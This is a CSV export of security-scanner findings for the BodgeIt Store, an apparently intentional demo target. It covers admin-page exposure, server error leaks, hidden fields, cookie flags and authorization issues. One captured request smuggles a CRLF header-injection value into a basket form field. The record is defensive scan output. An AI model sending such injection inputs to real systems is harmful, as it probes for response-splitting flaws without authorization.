<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Admin page</h3> <br/><center><table class=""border"" width=""80%""> <tr><th>UserId</th><th>User</th><th>Role</th><th>BasketId</th></tr> <tr> <td>1</td><td>user1@thebodgeitstore.com</td><td>USER</td><td>83</td> </tr> <tr> <td>2</td><td>admin@thebodgeitstore.com</td><td>ADMIN</td><td>0</td> </tr> <tr> <td>3</td><td>test@thebodgeitstore.com</td><td>USER</td><td>1</td> </tr> </table></center><br/> <br/><center><table class=""border"" width=""80%""> <tr><th>BasketId</th><th>UserId</th><th>Date</th></tr> <tr> <td>1</td><td>3</td><td>2015-10-15 17:17:03.131</td> </tr> <tr> <td>2</td><td>0</td><td>2015-10-15 17:20:54.62</td> </tr> <tr> <td>3</td><td>0</td><td>2015-10-15 17:20:59.854</td> </tr> <tr> <td>4</td><td>0</td><td>2015-10-15 17:20:59.917</td> </tr> <tr> <td>5</td><td>0</td><td>2015-10-15 17:20:59.932</td> </tr> <tr> <td>6</td><td>0</td><td>2015-10-15 17:22:07.026</td> </tr> <tr> <td>7</td><td>0</td><td>2015-10-15 17:22:07.073</td> </tr> <tr> <td>8</td><td>0</td><td>2015-10-15 17:22:07.073</td> </tr> <tr> <td>9</td><td>0</td><td>2015-10-15 17:22:07.073</td> </tr> <tr> <td>10</td><td>0</td><td>2015-10-15 17:22:07.104</td> </tr> <tr> <td>11</td><td>0</td><td>2015-10-15 17:22:07.12</td> </tr> <tr> <td>12</td><td>0</td><td>2015-10-15 17:22:07.136</td> </tr> <tr> <td>13</td><td>0</td><td>2015-10-15 17:22:07.136</td> </tr> <tr> <td>14</td><td>0</td><td>2015-10-15 17:22:07.136</td> </tr> <tr> <td>15</td><td>0</td><td>2015-10-15 17:22:07.167</td> </tr> <tr> <td>16</td><td>0</td><td>2015-10-15 17:22:07.167</td> </tr> <tr> <td>17</td><td>0</td><td>2015-10-15 17:22:07.167</td> </tr> <tr> <td>18</td><td>0</td><td>2015-10-15 17:22:07.198</td> </tr> <tr> <td>19</td><td>0</td><td>2015-10-15 17:22:07.214</td> </tr> <tr> <td>20</td><td>0</td><td>2015-10-15 17:22:07.214</td> </tr> <tr> <td>21</td><td>0</td><td>2015-10-15 17:22:07.229</td> </tr> <tr> <td>22</td><td>0</td><td>2015-10-15 17:22:07.261</td> </tr> <tr> <td>23</td><td>0</td><td>2015-10-15 17:22:07.276</td> </tr> <tr> <td>24</td><td>0</td><td>2015-10-15 17:22:10.167</td> </tr> <tr> <td>25</td><td>0</td><td>2015-10-15 17:22:10.526</td> </tr> <tr> <td>26</td><td>0</td><td>2015-10-15 17:22:10.542</td> </tr> <tr> <td>27</td><td>0</td><td>2015-10-15 17:22:10.558</td> </tr> <tr> <td>28</td><td>0</td><td>2015-10-15 17:22:10.636</td> </tr> <tr> <td>29</td><td>0</td><td>2015-10-15 17:22:10.651</td> </tr> <tr> <td>30</td><td>0</td><td>2015-10-15 17:22:11.495</td> </tr> <tr> <td>31</td><td>0</td><td>2015-10...","","AppScan requested a file which is probably not a legitimate part of the application. The response status was 200 OK. This indicates that the test succeeded in retrieving the content of the requested file.","<fixRecommendations> <fixRecommendation type=""General""> <text>Do not allow access to administration scripts without proper authorization, as it may allow an attacker to gain privileged rights.</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","14","Poor Error Handling: Server Error Message","","Low","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/basket.jsp","","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/product.jsp?prodid=7 Content-Type: application/x-www-form-urlencoded Content-Length: 59 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""813F043EB601621DEEE3A6F77B2BC6A2""; PSID=""F2239B8A3CEC359684886107925BCABC""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""90e84d4b-fe51-47a6-ace4-be01fbb9325c""; AttackSequence=""0""; AttackParamDesc=""quantity""; AttackParamIndex=""2""; AttackParamSubIndex=""0""; CheckId=""3582""; Engine=""Http+Response+Splitting""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%250d%250aSPIHeader%3a%2520SPIValue""; AttackStringProps=""Attack""; ThreadId=""35""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""49""; smi=""0""; sc=""1""; ID=""563b0b00-153d-45df-a7ac-92bf2441ad41""; X-Request-Memo: ID=""5246fcc8-23fa-430d-8c12-9e8f644c7f07""; sc=""1""; ThreadId=""66""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=95425C707A42EAA4BE0BC4F23058CD56;b_id=9 productid=7&price=3.5&quantity=1%0d%0aSPIHeader:%20SPIValue","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2674 Date: Thu, 15 Oct 2015 19:13:26 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue11&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue11&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:277) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","150","System Information Leak","","Low","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An information leak occurs when system data or debugging information leaves the program through an output stream or logging function. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code prints an exception to the standard error stream: <pre> try { ... } catch (Exception e) { e.printStackTrace(); } </pre> Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from &quot;Standard error&quot; or &quot;Standard output&quot; into a file or another program. Alternatively the system that the program runs on could have a remote logging mechanism such as a &quot;syslog&quot; server that will send the logs to a remote device. During development you will have no way of knowing where this information may end up being displayed. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. Here is another scenario, specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 2:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... public NdefMessage createNdefMessage(NfcEvent event) { TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); return msg; } ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper. In the example above, HPE Security Fortify Static Code Analyzer reports a System Information Leak vulnerability on the return statement.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","171","System Information Leak","","Low","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An information leak occurs when system data or debugging information leaves the program through an output stream or logging function. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code prints an exception to the standard error stream: <pre> try { ... } catch (Exception e) { e.printStackTrace(); } </pre> Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from &quot;Standard error&quot; or &quot;Standard output&quot; into a file or another program. Alternatively the system that the program runs on could have a remote logging mechanism such as a &quot;syslog&quot; server that will send the logs to a remote device. During development you will have no way of knowing where this information may end up being displayed. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. Here is another scenario, specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 2:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... public NdefMessage createNdefMessage(NfcEvent event) { TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); return msg; } ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper. In the example above, HPE Security Fortify Static Code Analyzer reports a System Information Leak vulnerability on the return statement.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","196","System Information Leak","","Low","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An information leak occurs when system data or debugging information leaves the program through an output stream or logging function. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code prints an exception to the standard error stream: <pre> try { ... } catch (Exception e) { e.printStackTrace(); } </pre> Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from &quot;Standard error&quot; or &quot;Standard output&quot; into a file or another program. Alternatively the system that the program runs on could have a remote logging mechanism such as a &quot;syslog&quot; server that will send the logs to a remote device. During development you will have no way of knowing where this information may end up being displayed. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. Here is another scenario, specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 2:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... public NdefMessage createNdefMessage(NfcEvent event) { TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); return msg; } ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper. In the example above, HPE Security Fortify Static Code Analyzer reports a System Information Leak vulnerability on the return statement.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","37","Hidden Field","","Low","Open","2015-10-15","Fortify SCA,WebInspect","472","External Control of Assumed-Immutable Web Parameter","","root/contact.jsp","","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>A hidden form field is used in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>.<AltParagraph>A hidden form field is used.</AltParagraph></Paragraph></Content> Explanation: <Content>Programmers often trust the contents of hidden fields, expecting that users will not be able to view them or manipulate their contents. Attackers will violate these assumptions. They will examine the values written to hidden fields and alter them or replace the contents with attack data. <b>Example:</b> An <code>&lt;input&gt;</code> tag of type <code>hidden</code> indicates the use of a hidden field. <pre> &lt;input type=""hidden""&gt; </pre> If hidden fields carry sensitive information, this information will be cached the same way the rest of the page is cached. This can lead to sensitive information being tucked away in the browser cache without the user's knowledge.</Content>","Recommendations: <Content>Expect that attackers will study and decode all uses of hidden fields in the application. Treat hidden fields as untrusted input. Don't store information in hidden fields if the information should not be cached along with the rest of the page.</Content>","","",""
"DemoApps","","Bodgeit","11","Cookie Security: HTTPOnly not Set","","Low","Open","2015-10-15","WebInspect","284","Improper Access Control","","/bodgeit/basket.jsp","","","http://localhost:8080/bodgeit/basket.jsp","","GET /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/ Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""3B81ACA60DABBBBC6BD8AF73C438EDDD""; PSID=""C94A4F2D201EA672774C0CF0F9E62874""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""75""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""ed8f891e-fc8f-4ce4-a209-af250926fd90""; X-Request-Memo: ID=""6aa3dba2-7a73-4f2b-b7fc-e45bbac20cf5""; sc=""1""; ThreadId=""57""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Set-Cookie: b_id=3 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2698 Date: Thu, 15 Oct 2015 19:10:02 GMT <script type=""text/javascript""> function incQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = --q.value; if (val < 0) { val = 0; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Basket</h3> <form action=""basket.jsp"" method=""post""> <table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Quantity</th><th>Price</th><th>Total</th></tr> <tr><td>Total</td><td style=""text-align: center""><input id=""update"" name=""update"" type=""submit"" value=""Update Basket""/></td><td>&nbsp;</td><td align=""right"">$0.00</td></tr> </table> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","544","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","554","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","574","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","575","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","282","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","306","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","311","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","336","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","340","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","362","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","393","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","442","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","444","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","445","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","456","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","459","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","468","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","469","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","471","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","479","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","480","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","507","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","517","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
